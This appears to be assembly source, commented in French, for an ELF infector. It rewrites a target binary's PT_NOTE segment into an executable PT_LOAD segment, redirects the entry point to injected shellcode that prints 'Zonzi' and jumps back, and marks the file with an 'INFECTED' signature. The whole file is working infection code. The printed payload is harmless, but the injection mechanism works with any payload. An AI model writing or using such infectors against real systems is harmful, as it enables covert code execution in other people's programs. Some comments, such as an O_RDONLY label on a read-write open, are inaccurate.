section .data
    magic_bytes db 0x7F, "ELF"    
    err_msg db "Ce n'est pas un fichier ELF valide", 10
    err_len equ $ - err_msg
    dir_msg db "C'est un répertoire", 10
    dir_len equ $ - dir_msg
    elf_msg db "C'est un fichier ELF.", 10
    elf_len equ $ - elf_msg
    mod_msg db "Un segment PT_NOTE a été modifié en PT_LOAD avec les permissions RWE", 10
    mod_len equ $ - mod_msg
    already_mod_msg db "Ce fichier a déjà été modifié", 10
    already_mod_len equ $ - already_mod_msg
    signature db "INFECTED", 0     
    sig_len equ $ - signature

    ; Messages de debug
    debug_original_entry db "Adresse d'entrée originale: 0x", 0
    debug_patch_addr db "Adresse du patch: 0x", 0
    debug_vaddr db "Adresse virtuelle calculée: 0x", 0
    debug_patch_value db "Valeur à patcher avec: 0x", 0
    debug_new_entry db "Nouveau point d'entrée: 0x", 0
    debug_newline db 10, 0

    ; Buffer pour conversion hex
    hex_buffer db "0000000000000000", 10, 0
    hex_chars db "0123456789ABCDEF"

    ; Shellcode position-independent
    shellcode:
        push rbp                   ; Sauvegarder le frame pointer
        mov rbp, rsp              ; Créer un nouveau frame
        
        pushf                     ; Sauvegarder les flags
        push rax
        push rbx
        push rcx
        push rdx
        push rsi
        push rdi
        push r8
        push r9
        push r10
        push r11

        ; Obtenir l'adresse du message de manière PIC
        lea rsi, [rel msg]        ; Utiliser lea avec rel pour le PIC
        jmp print_msg
    msg:
        db "Zonzi", 10
    print_msg:
        mov rax, 1              ; sys_write
        mov rdi, 1              ; stdout
        mov rdx, 6              ; longueur du message
        syscall

        pop r11
        pop r10
        pop r9
        pop r8
        pop rdi
        pop rsi
        pop rdx
        pop rcx
        pop rbx
        pop rax
        popf                    ; Restaurer les flags
        
        leave                   ; Restaurer rbp et rsp

        ; Placer l'instruction jmp après le leave pour assurer une pile propre
        db 0x48, 0xb8          ; movabs rax,
        dq 0x0000000000000000  ; adresse à patcher
        jmp rax

    shellcode_end:
    shellcode_len equ shellcode_end - shellcode
    
section .bss
    fd resq 1
    filename resq 1          ; Pour stocker le nom du fichier
    elf_header resb 64  
    stat_buf resb 144       ; Buffer pour stocker les informations stat
    phdr resb 56            ; Structure pour stocker un program header
    note_data resb 1024     ; Buffer pour sauvegarder les données du segment NOTE
    sig_buf resb 9
    original_entry_addr resq 1 ; Pour sauvegarder le point d'entrée original

section .text
global _start

; Fonction pour convertir un nombre en hexadécimal
hex_to_string:
    push rbx
    push rcx
    push rdx
    push rdi
    
    mov rcx, 16         ; 16 caractères à traiter
    lea rdi, [hex_buffer]
    
.loop:
    rol rax, 4          ; Rotation à gauche de 4 bits
    mov rdx, rax        
    and rdx, 0xf        ; Garder uniquement les 4 bits de poids faible
    lea rbx, [hex_chars]
    movzx rdx, byte [rbx + rdx]  ; Convertir en caractère hex
    mov [rdi], dl
    inc rdi
    dec rcx
    jnz .loop

    pop rdi
    pop rdx
    pop rcx
    pop rbx
    ret

; Fonction pour afficher une chaîne
print_string:
    push rax
    push rdi
    push rsi
    push rdx
    
    mov rdi, 1          ; stdout
    mov rax, 1          ; sys_write
    syscall
    
    pop rdx
    pop rsi
    pop rdi
    pop rax
    ret

_start:
    ; Récupérer le premier argument (nom du fichier)
    pop rdi                 ; Nombre d'arguments
    pop rdi                 ; Nom du programme  
    pop rdi                 ; Premier argument (nom du fichier)
    mov [filename], rdi     ; Sauvegarder le nom du fichier
    
    ; Appel système stat pour obtenir les informations du fichier
    mov rax, 4              ; sys_stat
    mov rsi, stat_buf       
    syscall
    test rax, rax           ; Vérifier si stat a réussi
    js exit                 ; Si erreur, sortir
    
    ; Vérifier si le fichier est un répertoire  
    mov rax, qword [stat_buf + 24]  ; Charger st_mode
    and rax, 0o170000       
    cmp rax, 0o040000       
    je is_directory         ; Sauter si répertoire

    ; Ouvrir le fichier en lecture seule
    mov rdi, [filename]     
    mov rax, 2              ; sys_open
    mov rsi, 2              ; O_RDONLY 
    syscall
    cmp rax, 0          
    jl exit
    mov [fd], rax           ; Sauvegarder le descripteur
    
    ; Lire l'en-tête ELF  
    mov rdi, rax
    mov rax, 0              ; sys_read
    mov rsi, elf_header     
    mov rdx, 64
    syscall
    
    ; Vérifier les bytes magiques ELF
    mov rsi, elf_header
    mov rdi, magic_bytes
    mov rcx, 4        
    repe cmpsb
    jne not_elf
    
    ; Afficher que c'est un fichier ELF
    mov rax, 1              ; sys_write    
    mov rdi, 1              ; stdout
    mov rsi, elf_msg
    mov rdx, elf_len  
    syscall

    ; Vérifier si le fichier a déjà été modifié
    movzx rcx, word [elf_header + 56]  ; e_phnum
    mov rbx, 0                          

check_if_modified:
    cmp rbx, rcx
    jge scan_headers        ; Passer si tous les headers sont vérifiés

    ; Calculer l'offset du Program Header courant 
    movzx rax, word [elf_header + 54]  ; e_phentsize
    mul rbx
    add rax, qword [elf_header + 32]   ; e_phoff  
    
    ; Lire le Program Header  
    mov rdi, [fd]
    mov rsi, rax                       
    xor rdx, rdx                       
    mov rax, 8              ; sys_lseek                         
    syscall
    
    mov rdi, [fd]
    mov rax, 0              ; sys_read                         
    mov rsi, phdr
    mov rdx, 56                        
    syscall
    
    ; Lire la signature potentielle à la fin du segment
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]
    add rsi, qword [phdr + 32]
    sub rsi, sig_len  
    xor rdx, rdx
    mov rax, 8              ; sys_lseek                        
    syscall
    
    mov rdi, [fd]
    mov rax, 0              ; sys_read                         
    mov rsi, sig_buf
    mov rdx, sig_len 
    syscall
    
    ; Comparer la signature
    mov rsi, sig_buf  
    mov rdi, signature
    mov rcx, sig_len
    repe cmpsb
    je file_already_modified    ; Sauter si déjà modifié
    
    inc rbx
    jmp check_if_modified

scan_headers:
    ; Rechercher un segment PT_NOTE à modifier
    movzx rcx, word [elf_header + 56]  
    mov rbx, 0                         

find_pt_note:
    cmp rbx, rcx
    jge exit

    ; Calculer l'offset du Program Header
    movzx rax, word [elf_header + 54]  
    mul rbx
    add rax, qword [elf_header + 32]   
    
    ; Lire le Program Header
    mov rdi, [fd]
    mov rsi, rax                       
    xor rdx, rdx                       
    mov rax, 8              ; sys_lseek                         
    syscall
    
    mov rdi, [fd]
    mov rax, 0              ; sys_read                         
    mov rsi, phdr
    mov rdx, 56                        
    syscall
    
    ; Vérifier si c'est un PT_NOTE
    mov eax, dword [phdr]
    cmp eax, 4              ; PT_NOTE
    je modify_header        ; Modifier si PT_NOTE
    
    inc rbx
    jmp find_pt_note

modify_header:
    ; Sauvegarder le point d'entrée original
    mov rax, qword [elf_header + 24]  
    mov [original_entry_addr], rax

    ; DEBUG: Afficher l'adresse d'entrée originale
    mov rsi, debug_original_entry
    mov rdx, 23        
    call print_string
    
    mov rax, [original_entry_addr]
    call hex_to_string
    mov rsi, hex_buffer
    mov rdx, 17        
    call print_string

    ; Calculer une nouvelle adresse virtuelle basée sur un multiple de la page et configure le segment
    mov dword [phdr], 1                ; PT_LOAD
    mov dword [phdr + 4], 7            ; PF_R | PF_W | PF_X

    ; Utiliser une adresse plus éloignée des bibliothèques dynamiques
    mov rax, 0x8000000                 ; 128MB offset
    mov qword [phdr + 16], rax         ; p_vaddr
    mov qword [phdr + 24], rax         ; p_paddr

    ; Calculer l'offset après tous les segments existants
    mov rax, 0x4000                    ; Offset suffisamment grand
    mov qword [phdr + 8], rax          ; p_offset

    ; Configurer les tailles et l'alignement
    mov qword [phdr + 32], shellcode_len  ; p_filesz
    mov qword [phdr + 40], shellcode_len  ; p_memsz
    mov qword [phdr + 48], 0x1000      ; p_align

    ; Mise à jour du point d'entrée pour pointer vers notre nouveau segment
    mov rax, qword [phdr + 16]         ; p_vaddr
    mov qword [elf_header + 24], rax   ; e_entry = p_vaddr

    ; DEBUG: Afficher l'adresse virtuelle calculée
    push rax
    mov rsi, debug_vaddr
    mov rdx, 25        
    call print_string
    
    mov rax, qword [phdr + 16]
    call hex_to_string
    mov rsi, hex_buffer
    mov rdx, 17        
    call print_string
    pop rax

    ; Copier le shellcode dans le buffer
    mov rdi, note_data
    mov rsi, shellcode
    mov rcx, shellcode_len
    rep movsb

    ; Trouver l'instruction movabs dans le shellcode
    mov rdi, note_data                 ; Base du shellcode
    mov rcx, shellcode_len
    sub rcx, 10                        ; Taille minimale pour l'instruction + adresse
    
find_movabs:
    cmp byte [rdi], 0x48              ; Premier byte de movabs
    je check_second_byte
    inc rdi
    loop find_movabs
    jmp exit                          ; Si non trouvé, sortir
    
check_second_byte:
    cmp byte [rdi + 1], 0xb8          ; Deuxième byte de movabs
    je found_movabs
    inc rdi
    loop find_movabs
    jmp exit
    
found_movabs:
    add rdi, 2                        ; Pointer après movabs
    
    ; DEBUG: Afficher l'adresse du patch
    push rdi
    mov rsi, debug_patch_addr
    mov rdx, 19
    call print_string
    
    mov rax, rdi
    call hex_to_string
    mov rsi, hex_buffer
    mov rdx, 17
    call print_string

    ; DEBUG: Afficher la valeur à patcher
    mov rsi, debug_patch_value
    mov rdx, 21
    call print_string

    mov rax, [original_entry_addr]    
    call hex_to_string
    mov rsi, hex_buffer
    mov rdx, 17
    call print_string

    ; Effectuer le patch avec l'adresse corrigée pour PIE
    pop rdi

    ; Trouver la base PIE en utilisant le premier segment LOAD
    mov rax, [phdr + 16]              ; Première adresse virtuelle du segment LOAD
    mov rdx, [phdr + 8]               ; Premier offset du segment
    sub rax, rdx                      ; Calculer la base PIE
    add rax, [original_entry_addr]    ; Ajouter l'offset original
    mov qword [rdi], rax              ; Patcher l'adresse

    ; Écrire l'en-tête ELF modifié
    mov rdi, [fd]
    xor rsi, rsi                        ; Début du fichier
    xor rdx, rdx
    mov rax, 8                          ; sys_lseek
    syscall
    
    mov rdi, [fd]
    mov rax, 1                          ; sys_write
    mov rsi, elf_header
    mov rdx, 64                         ; Taille de l'en-tête ELF
    syscall

    ; Écrire le program header modifié
    mov rdi, [fd]
    movzx rax, word [elf_header + 54]   ; e_phentsize
    mul rbx
    add rax, qword [elf_header + 32]    ; e_phoff
    mov rsi, rax                        ; Offset du program header
    xor rdx, rdx
    mov rax, 8                          ; sys_lseek
    syscall
    
    mov rdi, [fd]
    mov rax, 1                          ; sys_write
    mov rsi, phdr
    mov rdx, 56                         ; Taille du program header
    syscall

    ; Écrire le shellcode
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]           ; p_offset
    xor rdx, rdx
    mov rax, 8                          ; sys_lseek
    syscall
    
    mov rdi, [fd]
    mov rax, 1                          ; sys_write
    mov rsi, note_data
    mov rdx, shellcode_len              ; Taille du shellcode
    syscall

    ; Ajouter la signature
    mov rdi, [fd]
    mov rsi, qword [phdr + 8]           ; p_offset
    add rsi, shellcode_len              ; Ajouter après le shellcode
    sub rsi, sig_len                    ; Reculer de la taille de la signature
    xor rdx, rdx
    mov rax, 8                          ; sys_lseek
    syscall
    
    mov rdi, [fd]
    mov rax, 1                          ; sys_write
    mov rsi, signature
    mov rdx, sig_len
    syscall

    ; Afficher le message de succès
    mov rax, 1                          ; sys_write
    mov rdi, 1                          ; stdout
    mov rsi, mod_msg
    mov rdx, mod_len
    syscall
    
    jmp exit

file_already_modified:
    ; Informer que le fichier est déjà modifié
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout  
    mov rsi, already_mod_msg
    mov rdx, already_mod_len
    syscall  
    jmp exit

is_directory:
    ; Informer que le chemin est un répertoire
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout
    mov rsi, dir_msg  
    mov rdx, dir_len
    syscall
    jmp exit

not_elf:
    ; Informer que ce n'est pas un fichier ELF valide
    mov rax, 1              ; sys_write  
    mov rdi, 1              ; stdout
    mov rsi, err_msg
    mov rdx, err_len  
    syscall
    jmp exit

exit:
    ; Fermer le descripteur de fichier si ouvert  
    mov rax, 3                            ; sys_close
    syscall
    
    ; Quitter le programme
    mov rax, 60                           ; sys_exit  
    xor rdi, rdi                          ; Code de retour 0
    syscall